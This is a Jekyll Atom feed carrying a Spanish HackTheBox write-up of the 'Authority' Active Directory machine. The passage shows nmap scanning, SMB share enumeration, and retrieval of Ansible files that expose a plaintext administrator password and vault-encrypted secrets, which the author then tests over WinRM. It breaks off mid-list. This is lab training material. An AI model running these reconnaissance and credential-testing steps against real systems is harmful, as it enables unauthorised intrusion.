<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-07-11T00:03:36-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">MiguelRega7 - blog</title><subtitle>Posts sobre resoluci√≥n de CTFs y ciberseguridad.
</subtitle><author><name>MiguelRega7</name></author><entry><title type="html">HackTheBox - Authority (medium)</title><link href="http://localhost:4000/hackthebox/machines/medium/2024/07/10/authority.html" rel="alternate" type="text/html" title="HackTheBox - Authority (medium)" /><published>2024-07-10T00:00:00-06:00</published><updated>2024-07-10T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/medium/2024/07/10/authority</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/medium/2024/07/10/authority.html"><![CDATA[<p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/e6257bbacb2ddd56f5703bb61eadd8cb.png" />
</p>

<ul>
  <li>Authority is a medium-difficulty Windows machine that highlights the dangers of misconfigurations, password reuse, storing credentials on shares, and demonstrates how default settings in Active Directory (such as the ability for all domain users to add up to 10 computers to the domain) can be combined with other issues (vulnerable AD CS certificate templates) to take over a domain.</li>
</ul>

<h2 id="portscan">PortScan</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p53</span>,80,88,135,139,389,445,464,593,636,3268,3269,5985,8443,9389,47001,49664,49665,49666,49667,49673,49690,49691,49692,49693,49699,49700,49716,59430 10.10.11.222 <span class="nt">-oN</span> targeted
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-07-10 17:03 CST
Nmap scan report <span class="k">for </span>10.10.11.222
Host is up <span class="o">(</span>0.17s latency<span class="o">)</span><span class="nb">.</span>

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods:
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2024-07-11 03:03:43Z<span class="o">)</span>
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: authority.htb, Site: Default-First-Site-Name<span class="o">)</span>
| ssl-cert: Subject:
| Subject Alternative Name: othername: UPN::AUTHORITY<span class="nv">$@</span>htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
|_ssl-date: 2024-07-11T03:04:55+00:00<span class="p">;</span> +3h59m39s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: authority.htb, Site: Default-First-Site-Name<span class="o">)</span>
|_ssl-date: 2024-07-11T03:04:53+00:00<span class="p">;</span> +3h59m40s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: othername: UPN::AUTHORITY<span class="nv">$@</span>htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: authority.htb, Site: Default-First-Site-Name<span class="o">)</span>
|_ssl-date: 2024-07-11T03:04:55+00:00<span class="p">;</span> +3h59m39s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: othername: UPN::AUTHORITY<span class="nv">$@</span>htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: authority.htb, Site: Default-First-Site-Name<span class="o">)</span>
|_ssl-date: 2024-07-11T03:04:53+00:00<span class="p">;</span> +3h59m40s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: othername: UPN::AUTHORITY<span class="nv">$@</span>htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-title: Not Found
8443/tcp  open  ssl/https-alt
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>172.16.2.118
| Not valid before: 2024-07-09T02:50:28
|_Not valid after:  2026-07-11T14:28:52
|_http-title: Site doesn<span class="s1">'t have a title (text/html;charset=ISO-8859-1).
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.1 200
|     Content-Type: text/html;charset=ISO-8859-1
|     Content-Length: 82
|     Date: Thu, 11 Jul 2024 03:03:52 GMT
|     Connection: close
|     &lt;html&gt;&lt;head&gt;&lt;meta http-equiv="refresh" content="0;URL='</span>/pwm<span class="s1">'"/&gt;&lt;/head&gt;&lt;/html&gt;
|   GetRequest:
|     HTTP/1.1 200
|     Content-Type: text/html;charset=ISO-8859-1
|     Content-Length: 82
|     Date: Thu, 11 Jul 2024 03:03:50 GMT
|     Connection: close
|     &lt;html&gt;&lt;head&gt;&lt;meta http-equiv="refresh" content="0;URL='</span>/pwm<span class="s1">'"/&gt;&lt;/head&gt;&lt;/html&gt;
|   HTTPOptions:
|     HTTP/1.1 200
|     Allow: GET, HEAD, POST, OPTIONS
|     Content-Length: 0
|     Date: Thu, 11 Jul 2024 03:03:50 GMT
|     Connection: close
|   RTSPRequest:
|     HTTP/1.1 400
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 1936
|     Date: Thu, 11 Jul 2024 03:03:58 GMT
|     Connection: close
|     &lt;!doctype html&gt;&lt;html lang="en"&gt;&lt;head&gt;&lt;title&gt;HTTP Status 400
|     Request&lt;/title&gt;&lt;style type="text/css"&gt;body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 400
|_    Request&lt;/h1&gt;&lt;hr class="line" /&gt;&lt;p&gt;&lt;b&gt;Type&lt;/b&gt; Exception Report&lt;/p&gt;&lt;p&gt;&lt;b&gt;Message&lt;/b&gt; Invalid character found in the HTTP protocol [RTSP&amp;#47;1.00x0d0x0a0x0d0x0a...]&lt;/p&gt;&lt;p&gt;&lt;b&gt;Description&lt;/b&gt; The server cannot or will not process the request due to something that is perceived to be a client error (e.g., malformed request syntax, invalid
|_ssl-date: TLS randomness does not represent time
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49690/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49691/tcp open  msrpc         Microsoft Windows RPC
49692/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  msrpc         Microsoft Windows RPC
49699/tcp open  msrpc         Microsoft Windows RPC
49700/tcp open  msrpc         Microsoft Windows RPC
49716/tcp open  msrpc         Microsoft Windows RPC
59430/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8443-TCP:V=7.94SVN%T=SSL%I=7%D=7/10%Time=668F136A%P=x86_64-pc-linux
SF:-gnu%r(GetRequest,DB,"HTTP/1\.1\x20200\x20\r\nContent-Type:\x20text/htm
SF:l;charset=ISO-8859-1\r\nContent-Length:\x2082\r\nDate:\x20Thu,\x2011\x2
SF:0Jul\x202024\x2003:03:50\x20GMT\r\nConnection:\x20close\r\n\r\n\n\n\n\n
SF:\n&lt;html&gt;&lt;head&gt;&lt;meta\x20http-equiv=\"refresh\"\x20content=\"0;URL='</span>/pwm<span class="s1">'
SF:\"/&gt;&lt;/head&gt;&lt;/html&gt;")%r(HTTPOptions,7D,"HTTP/1\.1\x20200\x20\r\nAllow:\x
SF:20GET,\x20HEAD,\x20POST,\x20OPTIONS\r\nContent-Length:\x200\r\nDate:\x2
SF:0Thu,\x2011\x20Jul\x202024\x2003:03:50\x20GMT\r\nConnection:\x20close\r
SF:\n\r\n")%r(FourOhFourRequest,DB,"HTTP/1\.1\x20200\x20\r\nContent-Type:\
SF:x20text/html;charset=ISO-8859-1\r\nContent-Length:\x2082\r\nDate:\x20Th
SF:u,\x2011\x20Jul\x202024\x2003:03:52\x20GMT\r\nConnection:\x20close\r\n\
SF:r\n\n\n\n\n\n&lt;html&gt;&lt;head&gt;&lt;meta\x20http-equiv=\"refresh\"\x20content=\"0
SF:;URL='</span>/pwm<span class="s1">'\"/&gt;&lt;/head&gt;&lt;/html&gt;")%r(RTSPRequest,82C,"HTTP/1\.1\x20400\x20
SF:\r\nContent-Type:\x20text/html;charset=utf-8\r\nContent-Language:\x20en
SF:\r\nContent-Length:\x201936\r\nDate:\x20Thu,\x2011\x20Jul\x202024\x2003
SF::03:58\x20GMT\r\nConnection:\x20close\r\n\r\n&lt;!doctype\x20html&gt;&lt;html\x2
SF:0lang=\"en\"&gt;&lt;head&gt;&lt;title&gt;HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\
SF:x20Request&lt;/title&gt;&lt;style\x20type=\"text/css\"&gt;body\x20{font-family:Taho
SF:ma,Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:white;backgro
SF:und-color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{font-size:16px
SF:;}\x20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x20a\x20{color:
SF:black;}\x20\.line\x20{height:1px;background-color:#525D76;border:none;}
SF:&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x
SF:20Request&lt;/h1&gt;&lt;hr\x20class=\"line\"\x20/&gt;&lt;p&gt;&lt;b&gt;Type&lt;/b&gt;\x20Exception\x2
SF:0Report&lt;/p&gt;&lt;p&gt;&lt;b&gt;Message&lt;/b&gt;\x20Invalid\x20character\x20found\x20in\x20
SF:the\x20HTTP\x20protocol\x20\[RTSP&amp;#47;1\.00x0d0x0a0x0d0x0a\.\.\.\]&lt;/p&gt;&lt;
SF:p&gt;&lt;b&gt;Description&lt;/b&gt;\x20The\x20server\x20cannot\x20or\x20will\x20not\x2
SF:0process\x20the\x20request\x20due\x20to\x20something\x20that\x20is\x20p
SF:erceived\x20to\x20be\x20a\x20client\x20error\x20\(e\.g\.,\x20malformed\
SF:x20request\x20syntax,\x20invalid\x20");
Service Info: Host: AUTHORITY; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 3h59m39s, deviation: 0s, median: 3h59m38s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2024-07-11T03:04:43
|_  start_date: N/A
</span></code></pre></div></div>

<h2 id="enumeraci√≥n">Enumeraci√≥n</h2>

<ul>
  <li>Vamos a comenzar enumerando la m√°quina ya que tiene muchos puertos abiertos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ cme ldap 10.10.11.222
SMB         10.10.11.222    445    AUTHORITY        <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:AUTHORITY<span class="o">)</span> <span class="o">(</span>domain:authority.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Vamos agregar los dominios al <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ <span class="nb">echo</span> <span class="s2">"10.10.10.222 authority.htb authority.htb.corp DC.authority.htb dc.authority.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
authority.htb authority.htb.corp DC.authority.htb dc.authority.htb
</code></pre></div></div>

<ul>
  <li>Si enumeramos recursos compartidos por <code class="language-plaintext highlighter-rouge">smb</code> vemos los siguientes.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ smbclient <span class="nt">-N</span> <span class="nt">-L</span> //10.10.11.222

	Sharename       Type      Comment
	<span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
	ADMIN<span class="nv">$ </span>         Disk      Remote Admin
	C<span class="nv">$ </span>             Disk      Default share
	Department Shares Disk
	Development     Disk
	IPC<span class="nv">$ </span>           IPC       Remote IPC
	NETLOGON        Disk      Logon server share
	SYSVOL          Disk      Logon server share
Reconnecting with SMB1 <span class="k">for </span>workgroup listing.
do_connect: Connection to 10.10.11.222 failed <span class="o">(</span>Error NT_STATUS_RESOURCE_NAME_NOT_FOUND<span class="o">)</span>
Unable to connect with SMB1 <span class="nt">--</span> no workgroup available
</code></pre></div></div>

<ul>
  <li>Si analizamos el contenido de <code class="language-plaintext highlighter-rouge">Department Shares</code> vemos que no tenemos acceso.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ smbmap <span class="nt">-H</span> 10.10.11.222 <span class="nt">-u</span> <span class="s1">'xd'</span> <span class="nt">-p</span> <span class="s1">''</span> <span class="nt">-r</span> <span class="s1">'Department Shares'</span> <span class="nt">--no-banner</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>

<span class="o">[</span>+] IP: 10.10.11.222:445	Name: 10.10.11.222        	Status: Authenticated
	Disk                                                  	Permissions	Comment
	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
	Department Shares                                 	NO ACCESS	
	Development                                       	READ ONLY	
	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share
	SYSVOL                                            	NO ACCESS	Logon server share
</code></pre></div></div>

<ul>
  <li>Sin embargo en el recurso <code class="language-plaintext highlighter-rouge">Development</code> si tenemos permisos de lectura.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ smbclient //10.10.11.222/Development <span class="nt">-U</span> xd%xd
Try <span class="s2">"help"</span> to get a list of possible commands.
smb: <span class="se">\&gt;</span> <span class="nb">dir</span>
  <span class="nb">.</span>                                   D        0  Fri Mar 17 07:20:38 2023
  ..                                  D        0  Fri Mar 17 07:20:38 2023
  Automation                          D        0  Fri Mar 17 07:20:40 2023

		5888511 blocks of size 4096. 1132344 blocks available
smb: <span class="se">\&gt;</span> <span class="nb">cd </span>Automation
smb: <span class="se">\A</span>utomation<span class="se">\&gt;</span> <span class="nb">dir</span>
  <span class="nb">.</span>                                   D        0  Fri Mar 17 07:20:40 2023
  ..                                  D        0  Fri Mar 17 07:20:40 2023
  Ansible                             D        0  Fri Mar 17 07:20:50 2023

		5888511 blocks of size 4096. 1129444 blocks available
smb: <span class="se">\A</span>utomation<span class="se">\&gt;</span> <span class="nb">cd </span>Ansible
smb: <span class="se">\A</span>utomation<span class="se">\A</span>nsible<span class="se">\&gt;</span> <span class="nb">dir</span>
  <span class="nb">.</span>                                   D        0  Fri Mar 17 07:20:50 2023
  ..                                  D        0  Fri Mar 17 07:20:50 2023
  ADCS                                D        0  Fri Mar 17 07:20:48 2023
  LDAP                                D        0  Fri Mar 17 07:20:48 2023
  PWM                                 D        0  Fri Mar 17 07:20:48 2023
  SHARE                               D        0  Fri Mar 17 07:20:48 2023

		5888511 blocks of size 4096. 1185756 blocks available
smb: <span class="se">\A</span>utomation<span class="se">\A</span>nsible<span class="se">\&gt;</span>
</code></pre></div></div>

<ul>
  <li>Dentro de Share encontramos otro recurso que se llama <code class="language-plaintext highlighter-rouge">tasks</code> donde encontramos un <code class="language-plaintext highlighter-rouge">.yml</code> vamos a descargarlo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smb: <span class="se">\A</span>utomation<span class="se">\A</span>nsible<span class="se">\S</span>hare<span class="se">\&gt;</span> <span class="nb">cd </span>tasks<span class="se">\</span>
smb: <span class="se">\A</span>utomation<span class="se">\A</span>nsible<span class="se">\S</span>hare<span class="se">\t</span>asks<span class="se">\&gt;</span> <span class="nb">dir</span>
  <span class="nb">.</span>                                   D        0  Fri Mar 17 07:20:48 2023
  ..                                  D        0  Fri Mar 17 07:20:48 2023
  main.yml                            A     1876  Thu Sep 22 01:04:00 2022

		5888511 blocks of size 4096. 1254895 blocks available
smb: <span class="se">\A</span>utomation<span class="se">\A</span>nsible<span class="se">\S</span>hare<span class="se">\t</span>asks<span class="se">\&gt;</span> get main.yml
getting file <span class="se">\A</span>utomation<span class="se">\A</span>nsible<span class="se">\S</span>hare<span class="se">\t</span>asks<span class="se">\m</span>ain.yml of size 1876 as main.yml <span class="o">(</span>2.1 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 2.1 KiloBytes/sec<span class="o">)</span>
smb: <span class="se">\A</span>utomation<span class="se">\A</span>nsible<span class="se">\S</span>hare<span class="se">\t</span>asks<span class="se">\&gt;</span>
</code></pre></div></div>

<ul>
  <li>Este es el contenido.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ <span class="nb">cat </span>main.yml
    - name: Make subdirectories under Share
      ansible.windows.win_file:
        path: <span class="s2">""</span>
        state: directory
      loop:
        - C:<span class="se">\S</span>hare<span class="se">\I</span>nternal
        - C:<span class="se">\S</span>hare<span class="se">\I</span>nternal<span class="se">\I</span>T<span class="se">\P</span>ublic
        - C:<span class="se">\S</span>hare<span class="se">\I</span>nternal<span class="se">\I</span>T<span class="se">\P</span>rivate
        - C:<span class="se">\S</span>hare<span class="se">\I</span>nternal<span class="se">\H</span>R<span class="se">\P</span>ublic
        - C:<span class="se">\S</span>hare<span class="se">\I</span>nternal<span class="se">\H</span>R<span class="se">\P</span>rivate
        - C:<span class="se">\S</span>hare<span class="se">\I</span>nternal<span class="se">\R</span>&amp;D<span class="se">\P</span>ublic
        - C:<span class="se">\S</span>hare<span class="se">\I</span>nternal<span class="se">\R</span>&amp;D<span class="se">\P</span>rivate
        - C:<span class="se">\S</span>hare<span class="se">\I</span>nternal<span class="se">\M</span>arketing<span class="se">\P</span>ublic
        - C:<span class="se">\S</span>hare<span class="se">\I</span>nternal<span class="se">\M</span>arketing<span class="se">\P</span>rivate
        - C:<span class="se">\S</span>hare<span class="se">\I</span>nternal<span class="se">\F</span>inance<span class="se">\P</span>ublic
        - C:<span class="se">\S</span>hare<span class="se">\I</span>nternal<span class="se">\F</span>inance<span class="se">\P</span>rivate
        - C:<span class="se">\S</span>hare<span class="se">\I</span>nternal<span class="se">\E</span>xecutives<span class="se">\P</span>ublic
        - C:<span class="se">\S</span>hare<span class="se">\I</span>nternal<span class="se">\E</span>xecutives<span class="se">\P</span>rivate
        - C:<span class="se">\S</span>hare<span class="se">\I</span>nternal<span class="se">\A</span>ccounting<span class="se">\P</span>ublic
        - C:<span class="se">\S</span>hare<span class="se">\I</span>nternal<span class="se">\A</span>ccounting<span class="se">\P</span>rivate

    - name: Make user folders <span class="k">for </span>all <span class="nb">users
      </span>ansible.windows.win_powershell:
        script: |
          <span class="nv">$path</span> <span class="o">=</span> <span class="s2">"C:</span><span class="se">\S</span><span class="s2">hare</span><span class="se">\"</span><span class="s2">
          </span><span class="nv">$users</span><span class="s2"> = (Get-ADUser -Filter * ).Name
          foreach (</span><span class="nv">$user</span><span class="s2"> in </span><span class="nv">$users</span><span class="s2">) {
            New-Item -ItemType Directory -Force -Path </span><span class="nv">$path</span><span class="se">\$</span><span class="s2">user}

    - name: Create User Share
      win_share:
          name: ''
          description: ''
          path: ''
          list: ''
          full: ''
          read: ''
      with_items:
        - {path: 'C:</span><span class="se">\S</span><span class="s2">hare', share_name: 'User Share', share_description: 'Share for Users', full: 'Administrators, Domain Users', read: 'Domain Users', list: no }

    - name: Enable inherited ACL
      ansible.windows.win_acl_inheritance:
        path: C:</span><span class="se">\S</span><span class="s2">hare
        state: present

    - name: ACL
      ansible.windows.win_acl:
        path: C:</span><span class="se">\S</span><span class="s2">hare
        user: Administrator, Domain Users
        rights: Full Control
        type: 'Allow'
        inherit:  None
        propagation: 'None'
</span></code></pre></div></div>

<blockquote>
  <p>El script de Ansible main.yml est√° dise√±ado para automatizar la creaci√≥n de una estructura de carpetas para distintos departamentos y usuarios en un servidor Windows, as√≠ como para configurar los permisos de acceso y compartir el directorio principal C:\Share con los usuarios del dominio y administradores.</p>
</blockquote>

<ul>
  <li>Dentro de <code class="language-plaintext highlighter-rouge">pwn</code> hay varios archivos interesantes donde mencionan mucho ansible vamos a descargarlos para analizarlos mejor en nuestra m√°quina de atacante.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smb: <span class="se">\A</span>utomation<span class="se">\A</span>nsible<span class="se">\P</span>WM<span class="se">\&gt;</span> <span class="nb">dir</span>
  <span class="nb">.</span>                                   D        0  Fri Mar 17 07:20:48 2023
  ..                                  D        0  Fri Mar 17 07:20:48 2023
  ansible.cfg                         A      491  Thu Sep 22 00:36:58 2022
  ansible_inventory                   A      174  Wed Sep 21 17:19:32 2022
  defaults                            D        0  Fri Mar 17 07:20:48 2023
  handlers                            D        0  Fri Mar 17 07:20:48 2023
  meta                                D        0  Fri Mar 17 07:20:48 2023
  README.md                           A     1290  Thu Sep 22 00:35:58 2022
  tasks                               D        0  Fri Mar 17 07:20:48 2023
  templates                           D        0  Fri Mar 17 07:20:48 2023
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smb: <span class="se">\A</span>utomation<span class="se">\A</span>nsible<span class="se">\&gt;</span> prompt off
smb: <span class="se">\A</span>utomation<span class="se">\A</span>nsible<span class="se">\&gt;</span> recurse <span class="nb">true
</span>smb: <span class="se">\A</span>utomation<span class="se">\A</span>nsible<span class="se">\&gt;</span> mget PWM
getting file <span class="se">\A</span>utomation<span class="se">\A</span>nsible<span class="se">\P</span>WM<span class="se">\a</span>nsible.cfg of size 491 as PWM/ansible.cfg <span class="o">(</span>0.5 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 0.5 KiloBytes/sec<span class="o">)</span>
getting file <span class="se">\A</span>utomation<span class="se">\A</span>nsible<span class="se">\P</span>WM<span class="se">\a</span>nsible_inventory of size 174 as PWM/ansible_inventory <span class="o">(</span>0.2 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 0.4 KiloBytes/sec<span class="o">)</span>
getting file <span class="se">\A</span>utomation<span class="se">\A</span>nsible<span class="se">\P</span>WM<span class="se">\R</span>EADME.md of size 1290 as PWM/README.md <span class="o">(</span>1.4 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 0.7 KiloBytes/sec<span class="o">)</span>
getting file <span class="se">\A</span>utomation<span class="se">\A</span>nsible<span class="se">\P</span>WM<span class="se">\d</span>efaults<span class="se">\m</span>ain.yml of size 1591 as PWM/defaults/main.yml <span class="o">(</span>1.7 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 1.0 KiloBytes/sec<span class="o">)</span>
getting file <span class="se">\A</span>utomation<span class="se">\A</span>nsible<span class="se">\P</span>WM<span class="se">\h</span>andlers<span class="se">\m</span>ain.yml of size 4 as PWM/handlers/main.yml <span class="o">(</span>0.0 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 0.8 KiloBytes/sec<span class="o">)</span>
getting file <span class="se">\A</span>utomation<span class="se">\A</span>nsible<span class="se">\P</span>WM<span class="se">\m</span>eta<span class="se">\m</span>ain.yml of size 199 as PWM/meta/main.yml <span class="o">(</span>0.2 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 0.7 KiloBytes/sec<span class="o">)</span>
getting file <span class="se">\A</span>utomation<span class="se">\A</span>nsible<span class="se">\P</span>WM<span class="se">\t</span>asks<span class="se">\m</span>ain.yml of size 1832 as PWM/tasks/main.yml <span class="o">(</span>1.8 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 0.8 KiloBytes/sec<span class="o">)</span>
getting file <span class="se">\A</span>utomation<span class="se">\A</span>nsible<span class="se">\P</span>WM<span class="se">\t</span>emplates<span class="se">\c</span>ontext.xml.j2 of size 422 as PWM/templates/context.xml.j2 <span class="o">(</span>0.6 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 0.8 KiloBytes/sec<span class="o">)</span>
getting file <span class="se">\A</span>utomation<span class="se">\A</span>nsible<span class="se">\P</span>WM<span class="se">\t</span>emplates<span class="se">\t</span>omcat-users.xml.j2 of size 388 as PWM/templates/tomcat-users.xml.j2 <span class="o">(</span>0.5 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 0.8 KiloBytes/sec<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Encontramos credenciales <a href="https://www.redhat.com/es/topics/automation/learning-ansible-tutorial">https://www.redhat.com/es/topics/automation/learning-ansible-tutorial</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ <span class="nb">cat </span>ansible_inventory
ansible_user: administrator
ansible_password: Welcome1
ansible_port: 5985
ansible_connection: winrm
ansible_winrm_transport: ntlm
ansible_winrm_server_cert_validation: ignore
</code></pre></div></div>

<ul>
  <li>Si las probamos no nos funcionan.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ cme winrm 10.10.11.222 <span class="nt">-u</span> administrator <span class="nt">-p</span> <span class="s1">'Welcome1'</span>
SMB         10.10.11.222    5985   AUTHORITY        <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 <span class="o">(</span>name:AUTHORITY<span class="o">)</span> <span class="o">(</span>domain:authority.htb<span class="o">)</span>
HTTP        10.10.11.222    5985   AUTHORITY        <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.10.11.222:5985/wsman
WINRM       10.10.11.222    5985   AUTHORITY        <span class="o">[</span>-] authority.htb<span class="se">\a</span>dministrator:Welcome1
</code></pre></div></div>

<ul>
  <li>Dentro de <code class="language-plaintext highlighter-rouge">default</code> encontramos lo que parecen ser hashes <a href="https://docs.ansible.com/ansible/latest/vault_guide/vault_encrypting_content.html">https://docs.ansible.com/ansible/latest/vault_guide/vault_encrypting_content.html</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ <span class="nb">cat </span>main.yml
<span class="nt">---</span>
pwm_run_dir: <span class="s2">""</span>

pwm_hostname: authority.htb.corp
pwm_http_port: <span class="s2">""</span>
pwm_https_port: <span class="s2">""</span>
pwm_https_enable: <span class="nb">true

</span>pwm_require_ssl: <span class="nb">false

</span>pwm_admin_login: <span class="o">!</span>vault |
          <span class="nv">$ANSIBLE_VAULT</span><span class="p">;</span>1.1<span class="p">;</span>AES256
          32666534386435366537653136663731633138616264323230383566333966346662313161326239
          6134353663663462373265633832356663356239383039640a346431373431666433343434366139
          35653634376333666234613466396534343030656165396464323564373334616262613439343033
          6334326263326364380a653034313733326639323433626130343834663538326439636232306531
          3438

pwm_admin_password: <span class="o">!</span>vault |
          <span class="nv">$ANSIBLE_VAULT</span><span class="p">;</span>1.1<span class="p">;</span>AES256
          31356338343963323063373435363261323563393235633365356134616261666433393263373736
          3335616263326464633832376261306131303337653964350a363663623132353136346631396662
          38656432323830393339336231373637303535613636646561653637386634613862316638353530
          3930356637306461350a316466663037303037653761323565343338653934646533663365363035
          6531

ldap_uri: ldap://127.0.0.1/
ldap_base_dn: <span class="s2">"DC=authority,DC=htb"</span>
ldap_admin_password: <span class="o">!</span>vault |
          <span class="nv">$ANSIBLE_VAULT</span><span class="p">;</span>1.1<span class="p">;</span>AES256
          63303831303534303266356462373731393561313363313038376166336536666232626461653630
          3437333035366235613437373733316635313530326639330a643034623530623439616136363563
          34646237336164356438383034623462323531316333623135383134656263663266653938333334
          3238343230333633350a646664396565633037333431626163306531336336326665316430613566
          3764                         
</code></pre></div></div>

<ul>
  <li>Vemos que nos hablan sobre <code class="language-plaintext highlighter-rouge">pwm_admin_login</code> si buscamos la ruta en la web existe.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/authority/1.png" />
</p>

<ul>
  <li>
